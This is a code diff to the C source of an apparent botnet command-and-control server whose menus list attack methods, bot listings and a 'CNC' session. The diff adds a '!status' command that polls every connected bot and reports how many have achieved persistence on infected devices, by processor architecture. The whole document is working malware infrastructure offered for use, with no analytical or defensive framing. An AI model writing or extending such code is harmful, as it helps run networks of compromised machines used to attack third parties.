@@ -25,6 +25,7 @@ void handle_removeuser_command(const User *user, const char *command, char *resp
 void handle_kickuser_command(const User *user, const char *command, char *response);
 void handle_admin_command(const User *user, char *response);
 void handle_ping_command(char *response);
+void handle_status_command(const User *user, char *response);
 
 /*
 H E L P   C O M M A N D
@@ -33,7 +34,8 @@ void handle_help_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              PINK "!misc - shows misc commands\r\n"
              "!attack - shows attack methods\r\n"
-            "!admin - show admin and root commands\r\n"
+             "!admin - show admin and root commands\r\n"
+             "!status - check persistence status of bots\r\n"
              "!help - shows this msg\r\n" RESET);
 }
 /*
@@ -44,6 +46,7 @@ void handle_misc_command(char *response) {
              PINK "!stopall - stops all atks\r\n"
              "!opthelp - see attack options\r\n"
              "!bots - list bots\r\n"
+             "!status - check persistence status\r\n"
              "!user - show user or other users\r\n"
              "!clear - clear screen\r\n"
              "!exit - leave CNC\r\n" RESET);
@@ -333,6 +336,8 @@ void process_command(const User *user, const char *command, int client_socket, c
         handle_bots_command(response_buf);
     } else if (strcmp(command, "!ping") == 0) {
         handle_ping_command(response_buf);
+    } else if (strcmp(command, "!status") == 0) {
+        handle_status_command(user, response_buf);
     } else if (strcmp(command, "!clear") == 0) {
         handle_clear_command(response_buf);
     } else if (strcmp(command, "!opthelp") == 0) {
@@ -978,4 +983,63 @@ void handle_ping_command(char *response) {
         if (bots[i].is_valid && bots[i].socket > 0) valid_bots++;
     }
     pthread_mutex_unlock(&bot_mutex);
+}
+
+void handle_status_command(const User *user, char *response) {
+    int total_bots = 0;
+    int persistent_bots = 0;
+    int sent_requests = 0;
+    pthread_mutex_lock(&bot_mutex);
+
+    for (int i = 0; i < bot_count; i++) {
+        if (bots[i].is_valid && bots[i].socket > 0) {
+            total_bots++;
+            bots[i].status_reported = 0;
+            
+            if (send(bots[i].socket, "status", 6, MSG_NOSIGNAL) > 0) {
+                sent_requests++;
+            }
+        }
+    }
+    pthread_mutex_unlock(&bot_mutex);
+    
+    usleep(500000);
+    
+    pthread_mutex_lock(&bot_mutex);
+    int arch_count[12][2] = {0};
+    static const char* arch_names[] = {"mips", "mipsel", "x86_64", "aarch64", "arm", "x86", "m68k", "i686", "sparc", "powerpc64", "sh4", "unknown"};
+    
+    for (int i = 0; i < bot_count; i++) {
+        if (!bots[i].is_valid) continue;
+        
+        int arch_index = 11; // default to unknown
+        for (int j = 0; j < 11; j++) {
+            if (strcmp(bots[i].arch, arch_names[j]) == 0) {
+                arch_index = j;
+                break;
+            }
+        }
+        
+        arch_count[arch_index][0]++;
+        if (bots[i].is_persistent) {
+            persistent_bots++;
+            arch_count[arch_index][1]++;
+        }
+    }
+    pthread_mutex_unlock(&bot_mutex);
+    
+    int offset = snprintf(response, MAX_COMMAND_LENGTH, 
+                        YELLOW "Bot Status Report\r\n" RESET
+                        GREEN "Total bots: %d | Persistent bots: %d (%.1f%%)\r\n" RESET,
+                        total_bots, persistent_bots, 
+                        total_bots > 0 ? (persistent_bots * 100.0 / total_bots) : 0.0);
+
+    for (int i = 0; i < 12; i++) {
+        if (arch_count[i][0] > 0) {
+            offset += snprintf(response + offset, MAX_COMMAND_LENGTH - offset, 
+                            CYAN "%-10s: %3d total, %3d persistent (%5.1f%%)\r\n" RESET,
+                            arch_names[i], arch_count[i][0], arch_count[i][1],
+                            (arch_count[i][1] * 100.0) / arch_count[i][0]);
+        }
+    }
 }
